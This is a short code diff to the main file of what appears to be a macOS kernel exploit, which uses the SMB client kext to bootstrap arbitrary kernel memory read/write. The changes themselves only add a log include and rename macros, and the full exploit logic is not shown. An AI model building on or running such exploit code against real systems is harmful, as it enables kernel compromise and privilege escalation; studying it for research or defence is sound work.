@@ -15,6 +15,7 @@
 #include <arpa/inet.h>
 
 #include <xpl/xpl.h>
+#include <xpl/util/log.h>
 #include <xpl/util/binary.h>
 #include <xpl/util/assert.h>
 #include <xpl/util/msdosfs.h>
@@ -35,7 +36,7 @@ int main(int argc, const char* argv[]) {
     xpl_init();
     smb_client_load_kext();
     
-    char* socket_path = xpl_DEFAULT_KMEM_SOCKET;
+    char* socket_path = XPL_DEFAULT_KMEM_SOCKET;
     
     int ch;
     while ((ch = getopt(argc, (char**)argv, "k:")) != -1) {
@@ -65,8 +66,8 @@ int main(int argc, const char* argv[]) {
     bzero(&smb_addr, sizeof(smb_addr));
     smb_addr.sin_family = AF_INET;
     smb_addr.sin_len = sizeof(smb_addr);
-    smb_addr.sin_port = htons(xpl_SMBX_PORT);
-    inet_aton(xpl_SMBX_HOST, &smb_addr.sin_addr);
+    smb_addr.sin_port = htons(XPL_SMBX_PORT);
+    inet_aton(XPL_SMBX_HOST, &smb_addr.sin_addr);
     
     /// STEP 1: Use `kmem_boostrap.c` to setup slow arbitary kernel memory read / write
     xpl_kmem_backend_t kmem_slow = kmem_bootstrap_create(&smb_addr);
